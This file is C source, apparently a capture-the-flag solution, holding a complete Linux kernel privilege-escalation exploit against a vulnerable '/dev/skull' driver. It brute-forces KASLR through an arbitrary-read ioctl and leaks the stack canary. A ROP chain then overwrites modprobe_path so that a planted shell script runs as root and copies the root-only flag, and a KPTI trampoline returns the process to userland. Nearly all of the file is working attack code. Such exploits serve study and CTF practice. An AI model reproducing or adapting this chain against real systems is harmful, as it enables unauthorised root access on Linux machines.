#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>

#define BASE_ADDRESS (0xffffffff81000000)
#define kbase (0xffffffff00000000+(ctr<<20))
#define MODPROBE_PATH (0xffffffff82b3f280 - BASE_ADDRESS) + kbase 
// #define stack_leak (0xffffffff834ee851 - BASE_ADDRESS) + kbase
// @tripoloski
// proctection:
// SMAP & SMEP enabled
// Canary enabled
// KASLR enabled
// PTI enabled
// plan:
// using krop to bypass SMAP & SMEP then safely back to userland with kpti trampoline
// 

void fatal(const char *msg){
    perror(msg);
    exit(1);
}

int gain_shell(void){
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = { NULL };

    write(1,"[+] execute unkown file\n",24);
    execve("/home/blud/dummy", argv, envp);
    write(1,"[+] reading flag: ",18);

    char *flag[0x50];
    int fdx = open("/home/blud/flag", O_RDONLY);
    read(fdx, flag, 0x50);
    write(1, flag, sizeof(flag));
    return 0;
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;

void save_state(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp), "=r" (user_rflags)
        :
        : "memory"
    );
}


/* EXPLOIT START HERE */
int fd;
unsigned long leak;
struct request_t req;

struct request_t {
        void *dst;
        void *src;
};


long read_mem(void *src){
    req.dst = &leak;
    req.src = (void *)src;
    ioctl(fd, 0x6969, &req);
    return leak;
}

void create_trigger(void){
    system("echo '#!/bin/sh \ncp /root/flag /home/blud/flag\nchmod 777 /home/blud/flag' > /home/blud/A");
    system("chmod +x /home/blud/A");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/blud/dummy");
    system("chmod +x /home/blud/dummy");
}

void main(void){
    save_state();
    fd = open("/dev/skull", O_RDWR);
    assert(fd > 0);
    // unsigned long MODPROBE_PATH = 0xffffffff82b3f280;
    long TARGET = 0x6f6d2f6e6962732f; // "/sbin/mo" modprobe path
    unsigned long long ctr=0;
    while (leak != TARGET)
    {
        read_mem(MODPROBE_PATH);
        ctr++;
    }    

    printf("[+] leak found: 0x%016lx\n", leak);
    printf("[+] KASLR bypassed\n");
    printf("[+] modprobe_path: 0x%016lx\n", MODPROBE_PATH);
    printf("[+] kernel base: 0x%016lx\n", kbase);

    long target_val = 0x0a63636363636363;
    // unsigned long target_val = 0xcccccccccccccccc;

    // x = kbase+ 0x2561ec0
    // canary = x + 0xe6f0
    long stack_base, stack_leak, stack_leak_offset, canary_leak;
    stack_leak_offset = kbase + 0x2560588;
    stack_leak = read_mem(stack_leak_offset);
    printf("[+] stack offset: 0x%016lx\n", stack_leak_offset);
    printf("[+] stack leak: 0x%016lx\n", stack_leak);

    // 0xffffffff83660588
    // 0xffffffff83ffffff

    canary_leak = read_mem(kbase + 0x2397068); // -0x4e02
    // printf("canary leak: 0x%016lx\n", canary_leak);

    // force filling stack with junk
    char buf2[0x100];
    memset(buf2, 'A', 0x100-8);
    write(fd, buf2, 0x100);

    // getchar();
    // puts("ready??");

    long canary_pos = (canary_leak + 0x1a4e68) + (19*8);
    long canary_value = read_mem(canary_pos - 0x8);
    printf("[+] canary pos: 0x%016lx\n", canary_pos);
    printf("[+] canary value: 0x%016lx\n", canary_value);

    /* GADGET */
    // 0xffffffff82574dfb
    // 0xffffffff82574df9

    unsigned long pop_rdi = (0xffffffff81c76d7b - BASE_ADDRESS) + kbase - 0x100000; // pop rdi ; ret
    unsigned long ret = (0xffffffff83480150 - BASE_ADDRESS) + kbase - 0x100000; //
    unsigned long pop_rcx = (0xffffffff810e5733 - BASE_ADDRESS) + kbase - 0x100000; // pop rcx ; ret
    unsigned long pop_rbx = (0xffffffff81064167 - BASE_ADDRESS) + kbase - 0x100000 ; // pop rbx ; ret;
    unsigned long pop_rax = (0xffffffff8101c237 - BASE_ADDRESS) + kbase - 0x100000; 
    unsigned long mov_rdi_rax_call_rbx = (0xffffffff8131be0d - BASE_ADDRESS) + kbase - 0x100000;
    // 0xffffffff83240e5b
    unsigned long prepare_kernel_cred  = (0xffffffff810b4d90 - BASE_ADDRESS) + kbase - 0x100000;
    unsigned long commit_cred = (0xffffffff810b4ae0 - BASE_ADDRESS) + kbase - 0x100000;
    unsigned long swapgs_restore_regs_and_return_to_usermode = (0xffffffff82001641 - BASE_ADDRESS) + kbase - 0x100000;
    unsigned long mov_rcx_eax = (0xffffffff812547f3 - BASE_ADDRESS) + kbase - 0x100000;
    printf("[+] kpti trampoline found: 0x%016lx\n", swapgs_restore_regs_and_return_to_usermode);
    // getchar();

    // trying modprobe overwrite
    unsigned long evil_str = 0x2f686f6d652f;

    unsigned long iretq = 0xffffffff81036893;
    unsigned long swapgs = 0xffffffff82001e88;
    // 
    // 0xffffffff83240e5e : mov rdi, rax ; call rbx
    // 0xffffffff81064167 : pop rbx ; ret
    // ffffffff810b4d90 T prepare_kernel_cred
    // ffffffff810b4ae0 T commit_creds
    // ffffffff82001610 T swapgs_restore_regs_and_return_to_usermode + cut pop
    // 0xffffffff8101c237 : pop rax ; ret
    // 0xffffffff812547f3 : mov dword ptr [rcx], eax ; ret
    // 0xffffffff812547f3 : mov dword ptr [rcx], eax ; ret
    // 0xffffffff83284163 : out dx, eax ; mov qword ptr [rsp + 0x18], rax ; mov rsi, rax ; call r12
    // 0xffffffff814a7dd7 : mov rcx, rax ; mov rdi, rax ; jmp 0xffffffff814a7c82

    printf("[+] create evil shellscript /home/blud/A\n");
    create_trigger();
    printf("[+] ROP chain overwrite modprobe_path\n");
    // char buf2[0x100];
    memset(buf2, 'A', 0x100);
    unsigned long *rop = (unsigned long *)&buf2[0x100];
    *rop++ = canary_value;
    
    *rop++ = pop_rcx;
    *rop++ = MODPROBE_PATH - 0x100000+1;
    *rop++ = pop_rax;
    *rop++ = 0x656d6f68;
    *rop++ = mov_rcx_eax;

    *rop++ = pop_rcx;
    *rop++ = MODPROBE_PATH - 0x100000+1 +5;
    *rop++ = pop_rax;
    *rop++ = 0x64756c62;
    *rop++ = mov_rcx_eax;

    *rop++ = pop_rcx;
    *rop++ = MODPROBE_PATH - 0x100000+1 +9;
    *rop++ = pop_rax;
    *rop++ = 0x412f;
    *rop++ = mov_rcx_eax;

    *rop++ = swapgs_restore_regs_and_return_to_usermode;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (unsigned long*)&gain_shell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_rsp;
    *rop++ = user_ss;
    // *rop++ = 0xdeadbeef;
    // *rop++ = 0xdeadbeef;
    // *rop++ = 0xdeadbeef;
    // *rop++ = 0xdeadbeef;    
    // *rop++ = 0xdeadbeef;

    write(fd, buf2, 0x200);

}